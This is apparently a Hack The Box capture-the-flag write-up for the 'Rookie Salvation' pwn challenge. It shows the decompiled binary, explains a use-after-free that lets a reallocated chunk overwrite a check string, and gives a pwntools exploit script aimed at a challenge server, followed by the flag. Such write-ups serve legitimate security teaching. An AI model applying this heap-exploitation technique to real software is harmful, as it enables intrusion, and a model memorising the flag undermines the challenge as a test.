# Rookie Salvation

Decompile in IDA:

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 v3; // rax
  int v4; // edx
  int v5; // ecx
  int v6; // r8d
  int v7; // r9d

  banner(argc, argv, envp);
  allocated_space = malloc(0x26u);
  strcpy((char *)allocated_space + 0x1E, "deadbeef");
  while ( 1 )
  {
    v3 = menu();
    if ( v3 == 3 )
      road_to_salvation();
    if ( v3 > 3 )
      break;
    if ( v3 == 1 )
    {
      reserve_space();
    }
    else
    {
      if ( v3 != 2 )
        break;
      obliterate();
    }
  }
  fail((unsigned int)&unk_32E8, (_DWORD)argv, v4, v5, v6, v7);
}

void __noreturn road_to_salvation()
{
  int v0; // edx
  int v1; // ecx
  int v2; // r8d
  int v3; // r9d
  int v4; // edx
  int v5; // ecx
  int v6; // r8d
  int v7; // r9d
  FILE *stream; // [rsp+8h] [rbp-48h]
  char s[8]; // [rsp+10h] [rbp-40h] BYREF
  __int64 v10; // [rsp+18h] [rbp-38h]
  __int64 v11; // [rsp+20h] [rbp-30h]
  __int64 v12; // [rsp+28h] [rbp-28h]
  __int64 v13; // [rsp+30h] [rbp-20h]
  __int64 v14; // [rsp+38h] [rbp-18h]
  unsigned __int64 v15; // [rsp+48h] [rbp-8h]

  v15 = __readfsqword(0x28u);
  if ( !strcmp((const char *)allocated_space + 30, "w3th4nds") )
  {
    success((unsigned int)&unk_2F98, (unsigned int)"w3th4nds", v0, v1, v2, v3);
    *(_QWORD *)s = 0;
    v10 = 0;
    v11 = 0;
    v12 = 0;
    v13 = 0;
    v14 = 0;
    stream = fopen("flag.txt", "r");
    if ( !stream )
      fail((unsigned int)&unk_2FF8, (unsigned int)"r", v4, v5, v6, v7);
    fflush(stdin);
    fgets(s, 48, stream);
    printf("%sH%s\n", "\x1B[0m", s);
    fflush(stdout);
    exit(0);
  }
  fail((unsigned int)&unk_3118, (unsigned int)"w3th4nds", v0, v1, v2, v3);
}

unsigned __int64 __fastcall reserve_space(__int64 a1, int a2, int a3, int a4, int a5, int a6)
{
  int v6; // edx
  int v7; // ecx
  int v8; // r8d
  int v9; // r9d
  int v11; // [rsp+Ch] [rbp-14h] BYREF
  void *v12; // [rsp+10h] [rbp-10h]
  unsigned __int64 v13; // [rsp+18h] [rbp-8h]

  v13 = __readfsqword(0x28u);
  info((unsigned int)&unk_3240, a2, a3, a4, a5, a6);
  fflush(stdout);
  v11 = 0;
  __isoc99_scanf("%d", &v11);
  v12 = malloc(v11);
  info((unsigned int)&unk_3288, (unsigned int)&v11, v6, v7, v8, v9);
  fflush(stdout);
  __isoc99_scanf("%s", v12);
  return v13 - __readfsqword(0x28u);
}

unsigned __int64 obliterate()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  free(allocated_space);
  return v1 - __readfsqword(0x28u);
}
```

There is a use after free bug: we can free the space pointed by `allocate_space`, and allocate space of the same size, so the same pointer is returned by `malloc`. We can write the correct payload to it to pass the validation to get flag.

Attack:

```python
from pwn import *

elf = ELF("./rookie_salvation")
context.binary = elf
context.terminal = ["tmux", "split-w", "-h"]
context(arch="amd64", os="linux", log_level="debug")

# p = process("./rookie_salvation")
p = remote("46.101.142.27", 32369)

# gdb.attach(p)
# pause()

# free the allocated space
p.recvuntil(b"> ")
p.sendline(b"2")

# reallocate the same sized chunk
p.recvuntil(b"> ")
p.sendline(b"1")
# length: 0x26
p.sendline(b"38")
# content:
p.sendline(b"A" * 30 + b"w3th4nds")

# get flag
p.recvuntil(b"> ")
p.sendline(b"3")

p.interactive()
```

Flag: `HTB{h34p_2_h34v3n}`.
